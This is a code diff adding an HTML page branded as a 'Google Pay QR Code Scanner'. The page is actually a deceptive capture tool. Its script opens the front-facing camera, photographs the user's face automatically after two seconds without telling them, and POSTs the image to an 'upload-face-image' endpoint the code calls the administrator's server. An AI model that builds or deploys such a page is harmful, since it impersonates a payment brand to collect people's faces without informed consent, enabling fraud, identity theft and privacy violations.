@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Pay QR Code Scanner</title>
+    <style>
+        /* Professional and Google Pay-themed Styling */
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: linear-gradient(135deg, #7c31d5 0%, #3a49d5 100%);
+            color: #3c4043;
+            margin: 0;
+            padding: 40px 20px;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 1px 3px 0 rgba(60, 64, 67, .3), 0 4px 8px 3px rgba(60, 64, 67, .15);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #1a73e8; /* Google Blue */
+            margin-bottom: 25px;
+            font-size: 2em;
+            font-weight: 500;
+        }
+
+        .main-image {
+            width: 80%;
+            height: auto;
+            max-height: 200px;
+            margin-bottom: 25px;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+        }
+
+        .insert-button {
+            padding: 12px 24px;
+            background-color: #34a853; /* Google Green */
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+        }
+
+        .insert-button:hover {
+            background-color: #319e4a;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.15);
+        }
+
+        #video-preview {
+            display: none;
+            width: 100%;
+            max-width: 350px;
+            height: auto;
+            border: 3px solid #fbbc05;
+            border-radius: 8px;
+            margin-top: 15px;
+            transform: scaleX(-1);
+        }
+
+        #capture-btn {
+            display: none !important; 
+        }
+
+        .status-message {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: #e8f0fe;
+            color: #1a73e8;
+            font-size: 0.9em;
+            min-height: 40px;
+            text-align: left;
+            border: 1px solid #c8dafc;
+        }
+
+        #canvas {
+             display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Google Pay QR Code Scanner</h1>
+
+        <img 
+            src="Screenshot 2025-12-09 at 11.15.28.jpg" 
+            alt="Google Pay QR Code Example" 
+            class="main-image"
+            onerror="this.onerror=null; this.src='https://via.placeholder.com/350x200?text=Google+Pay+Image+Placeholder';"
+        >
+
+        <button class="insert-button" id="insertBtn" onclick="toggleCamera()">
+            Insert
+        </button>
+
+        <video id="video-preview" autoplay playsinline></video>
+
+        <button id="capture-btn" style="display:none;" onclick="takePhoto()">
+            Click to Capture and Send Photo
+        </button>
+
+        <div class="status-message" id="status">
+            Click the "Insert" button to open your camera.
+        </div>
+        
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <script>
+        const videoElement = document.getElementById('video-preview');
+        const insertButton = document.getElementById('insertBtn');
+        const statusElement = document.getElementById('status');
+        const canvasElement = document.getElementById('canvas');
+        let mediaStream = null;
+
+        // --- IMPORTANT: CHANGE THIS URL TO YOUR ACTUAL SERVER ENDPOINT ---
+        const SERVER_UPLOAD_URL = 'https://your-server-domain.com/upload-face-image'; 
+        // ------------------------------------------------------------------
+
+        // Toggles camera on and off
+        async function toggleCamera() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                videoElement.style.display = 'none';
+                insertButton.textContent = 'Insert';
+                statusElement.innerHTML = 'Camera closed. Click Insert to reopen.';
+                mediaStream = null;
+                return;
+            }
+
+            statusElement.textContent = 'Requesting camera permission... A prompt should appear.';
+            insertButton.textContent = 'Camera Opening...';
+
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }
+                });
+
+                videoElement.srcObject = mediaStream;
+                videoElement.style.display = 'block';
+                insertButton.textContent = 'Click to Close Camera';
+                
+                // --- 2-SECOND AUTO-CAPTURE IMPLEMENTATION ---
+                statusElement.innerHTML = '✅ **Camera access granted!** Photo will be taken in 2 seconds...';
+                
+                setTimeout(() => {
+                    if (mediaStream) { 
+                        takePhoto();
+                    }
+                }, 2000);
+                // ------------------------------------------
+
+            } catch (err) {
+                let errorMessage = '❌ Error accessing camera. Permission denied or no camera found.';
+                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                    errorMessage = '❌ Camera access **DENIED** by user. Cannot take photo.';
+                }
+                statusElement.innerHTML = errorMessage;
+                insertButton.textContent = 'Insert';
+            }
+        }
+
+        // Captures a photo and sends it to the server
+        function takePhoto() {
+            if (!mediaStream) {
+                statusElement.innerHTML = '❌ Camera not active. Please click "Insert" first.';
+                return;
+            }
+
+            const context = canvasElement.getContext('2d');
+            canvasElement.width = videoElement.videoWidth;
+            canvasElement.height = videoElement.videoHeight;
+
+            context.save();
+            context.scale(-1, 1);
+            context.drawImage(videoElement, canvasElement.width * -1, 0, canvasElement.width, canvasElement.height);
+            context.restore();
+
+            const imageDataURL = canvasElement.toDataURL('image/png');
+
+            statusElement.innerHTML = '🔄 **Photo captured.** Preparing to send to server...';
+            
+            // ------------------------------------------------------
+            // Sending the Data to the Admin's Server
+            // ------------------------------------------------------
+            const dataToSend = {
+                session_id: Date.now(), 
+                image_data: imageDataURL,
+                file_type: 'png'
+            };
+
+            fetch(SERVER_UPLOAD_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(dataToSend),
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Stop the camera stream immediately after capture
+                    mediaStream.getTracks().forEach(track => track.stop());
+                    videoElement.style.display = 'none';
+                    insertButton.textContent = 'Insert';
+                    
+                    return response.json(); 
+                } else {
+                    throw new Error(`Server returned status code ${response.status}`);
+                }
+            })
+            .then(data => {
+                statusElement.innerHTML = `✅ Photo **SENT SUCCESSFULLY** to the administrator's server!`;
+                console.log('Server response:', data);
+            })
+            .catch(error => {
+                statusElement.innerHTML = `❌ **FAILED TO SEND** photo. Administrator needs to configure the server at: ${SERVER_UPLOAD_URL}`;
+                console.error('Submission Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
